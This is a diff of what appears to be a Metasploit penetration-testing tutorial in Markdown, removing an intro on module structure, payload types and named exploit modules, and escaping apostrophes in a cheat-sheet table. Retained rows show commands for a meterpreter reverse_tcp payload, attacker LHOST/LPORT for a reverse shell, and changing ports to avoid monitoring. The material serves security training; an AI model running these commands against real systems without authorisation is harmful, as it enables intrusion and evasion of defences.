@@ -1,38 +1,3 @@
-## Exploit module structure in Metasploit
-
-Each Metasploit exploit module includes:
-
-- **Name and description:** CVE reference and summary
-- **Targets:** Operating systems or software versions affected
-- **Payload compatibility:** List of usable payloads
-- **Options:** RHOSTS, RPORT, USERNAME, etc.
-- **Check function:** Some modules include a check function to verify vulnerability before exploiting
-
-## **Understanding payloads in Metasploit**
-
-After successfully exploiting a vulnerability, you need a way to interact with the compromised system. This is where payloads come into play. The following section breaks down how Metasploit organizes and implements payloads to maximize your effectiveness during security assessments.
-
-**Payloads serve as the executable code that runs on target systems after successful exploitation.** The Metasploit framework employs a modular payload architecture that maximizes flexibility and effectiveness across different attack scenarios.
-
-## **Payload architecture**
-
-Metasploit organizes payloads into three distinct categories:
-
-- **Singles** function as self-contained payloads that perform specific actions independently. These lightweight options work well for creating backdoors, adding system users, or executing simple commands when space constraints limit payload size.
-    
-- **Stagers** establish communication channels between the attacker and the target system. These lightweight payloads download and execute larger, more functional payloads while using standard ports like HTTP or HTTPS to evade detection.
-    
-- **Stages** provide the full-featured functionality delivered by stagers. These powerful components offer comprehensive system access, file operations, and advanced capabilities like keylogging or webcam access.```
-## Types of exploits
-
-|Exploit type|Command|Explanation|
-|---|---|---|
-|**Remote exploit**|1. 1<br><br>1. `exploit/windows/smb/ms17_010_eternalblue`<br><br>Copied!Wrap Toggled!|Targets services over the network|
-|**Local exploit**|1. 1<br><br>1. `exploit/linux/local/dirty_cow`<br><br>Copied!Wrap Toggled!|Used post-access to escalate privileges|
-|**Client-side exploit**|1. 1<br><br>1. `exploit/windows/browser/ms12_063_ie_execcommand_uaf`<br><br>Copied!Wrap Toggled!|Used in phishing attacks and requires user interaction|
-|**Web exploit**|1. 1<br><br>1. `exploit/multi/http/apache_path_traversal`<br><br>Copied!Wrap Toggled!|Targets web servers and apps like Apache|
-
-----------------------------
 
 ## Understanding auxiliary modules and their categories
 
@@ -494,15 +459,15 @@ This cheat sheet summarizes key commands and concepts for developing, modifying,
 |---|---|---|---|
 |**Locate Metasploit exploits**|1. `search <term>`|1. `search vsftpd`|Finds existing Metasploit modules by name, common vulnerabilities and exposures (CVEs), or service to inspect or reuse them|
 |**Open Metasploit exploit source**|Navigate to path and open file|1. `nano /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb`|Examine or modify Ruby-based exploit modules|
-|**Reload changed modules**|1. `reload_all`|1. `reload_all`|Refreshes Metasploit's module cache after editing exploit files|
+|**Reload changed modules**|1. `reload_all`|1. `reload_all`|Refreshes Metasploit\'s module cache after editing exploit files|
 |**Set payload**|1. `set PAYLOAD <payload>`|1. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`|Assigns a compatible payload for the target system|
-|**Set listening port**|1. `set LPORT <port>`|1. `set LPORT 4444`|Defines the attacker's listening port to receive a reverse shell|
-|**Set attacker IP**|1. `set LHOST <ip>`|1. `set LHOST 192.168.1.10`|Sets your machine's IP address to receive the callback|
+|**Set listening port**|1. `set LPORT <port>`|1. `set LPORT 4444`|Defines the attacker\'s listening port to receive a reverse shell|
+|**Set attacker IP**|1. `set LHOST <ip>`|1. `set LHOST 192.168.1.10`|Sets your machine\'s IP address to receive the callback|
 |**Launch modified exploit**|1. `run`<br><br>          <br><br>        <br><br>1. `exploit`|1. `exploit`|Executes the exploit using modified logic or settings|
 |**Observe crash behavior**|1. `dmesg`<br><br>          <br><br>        <br><br>1. `gdb`<br><br>          <br><br>        <br><br>1. `ASAN`|1. `dmesg \| tail`|Use logs or debuggers to detect memory violations or faults post-exploitation|
 |**Fuzz a service (Boofuzz)**|Python + session.fuzz()|1. `session.fuzz() in custom script`|Initiates fuzzing with malformed inputs to uncover vulnerabilities|
 |**Create proof of concept**|Minimal script|1. `sock.put(malformed_input)`|Validates the vulnerability without delivering a payload|
-|**Write a basic custom exploit**|Ruby exploit block|1. `See the example, "Basic exploit method in Ruby" below`|Follow Metasploit's structure: connect, payload, handler, disconnect|
+|**Write a basic custom exploit**|Ruby exploit block|1. `See the example, \"Basic exploit method in Ruby\" below`|Follow Metasploit\'s structure: connect, payload, handler, disconnect|
 |**Bypass blocked ports**|1. `set LPORT`|1. `set LPORT 2222`|Change communication ports if standard ones (for example, 4444) are monitored|
 |**Use AFL/libFuzzer**|Fuzzer integration|1. `afl-fuzz -i input -o output ./target`|Run instrumentation-based fuzzers to guide fuzzing via code coverage|
 
@@ -539,27 +504,4 @@ end
 |**Boofuzz/SPIKE/Peach**|Smart fuzzing frameworks|
 |**Pwntools**|Exploit scripting in Python|
 |**msfvenom**|Payload generation|
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
